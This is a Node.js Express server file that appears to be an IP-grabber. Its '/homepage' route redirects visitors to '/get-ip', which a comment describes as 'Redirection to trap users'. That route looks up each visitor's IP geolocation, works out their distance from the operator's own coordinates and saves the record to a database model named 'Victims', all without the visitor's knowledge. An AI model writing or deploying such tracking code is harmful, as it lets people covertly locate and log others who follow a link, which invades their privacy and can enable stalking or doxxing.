// Server.js
// Copyright 2020-2021


// NPM Dependencies
require('dotenv').config();

const express = require("express");
const chalk = require('chalk');
const expressip = require('express-ip');
const ejs = require('ejs');
const mongoose = require('mongoose');
const geolib = require('geolib');

// Import JS Files
const Victims = require('./model');

// Creation of the app
const app = express();

// Force to use HTTPS instead of HTTP
app.set("trust proxy", true);
app.use((req, res, next) => {
  if (!req.secure) return res.redirect("https://" + req.get("host") + req.url);
  next();
});

// Connection with the database
mongoose.connect(process.env.DATABASE_URI, {
    useUnifiedTopology: true,
    useNewUrlParser: true
});

const db = mongoose.connection;

// Database response handling
db.on('connected', () => {
    console.log(chalk.yellow('database connected'));
});

db.on('disconnected', () => {
    console.log(chalk.redBright('database disconnected'));
});

db.on('error', () => {
    console.error(chalk.red('connection error'));
});

db.on('open', () => {
    console.log(chalk.green('database open'));
});

// Initialization of the server PORT
const PORT = process.env.PORT || 3000;

// My personal IP Address
const myIP = process.env.MY_IP;

// Middlewares
app.use(express.static("public"));
app.use(express.urlencoded({ extended: false }));
app.use(expressip().getIpInfoMiddleware);
app.use(express.json());
app.set('view engine', 'ejs');

// GET Request
app.get('/', (req, res) => {

    // Render the main page
    res.render('pages/index');
});

app.get('/homepage', (req, res) => {

    // Redirection to trap users
    res.redirect('/get-ip');
});

app.get('/get-ip', (req, res) => {

    // Get the distance between me and the user
    const distance = geolib.getPreciseDistance(
        {
            latitude: process.env.MY_LATTITUDE,
            longitude: process.env.MY_LONGITUDE
        },
        {
            latitude: req.ipInfo.ll[0],
            longitude: req.ipInfo.ll[1]
        }
    );

    console.log(chalk.bgGreen(`The distance between me and the user is ${distance}.`));

    // Creating object to save on the database
    let myData = new Victims(req.ipInfo);
    myData.distance = distance;

    // Save data on the database
    myData.save()
        .then(item => {
            console.log(chalk.bgGreen('username saved in the database'));
        })
        .catch(err => {
            console.log(chalk.bgRed('problem while saving username in the databse'));
        });
    
    // Render the page with user info
    res.render('pages/home', {
        info: req.ipInfo
    });

});

// App listening
app.listen(PORT, () => {
  console.log(chalk.bgYellow(`Server listening on port ${PORT}...`));
});
